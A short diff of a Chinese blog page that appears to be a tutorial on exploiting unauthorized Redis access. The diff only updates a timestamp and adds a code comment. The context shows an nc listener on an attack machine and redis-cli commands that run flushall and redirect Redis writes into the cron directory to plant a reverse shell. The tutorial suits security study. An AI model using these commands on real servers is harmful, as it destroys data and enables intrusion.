@@ -316,7 +316,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-09-02 18:31:32'>2020-09-01 11:25</time>
+            发布时间 : <time class="date" title='最后更新: 2020-09-02 18:49:21'>2020-09-01 11:25</time>
         
     </div>
     <div class="article-meta">
@@ -467,7 +467,7 @@ save                         #进行备份     </code></pre>
 <h4 id="详细步骤：-1"><a href="#详细步骤：-1" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>先在攻击机使用nc监听8888端口<code>nc -lvp 8888</code></p>
 <p><img src="/2020/09/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/8.jpg"></p>
 <p>然后去操作Redis，具体命令：</p>
-<pre><code>redis-cli -h 192.168.33.134
+<pre><code>redis-cli -h 192.168.33.134    #连接数据库
  flushall
 config set dir /var/spool/cron/crontabs/
 config set dbfilename shell
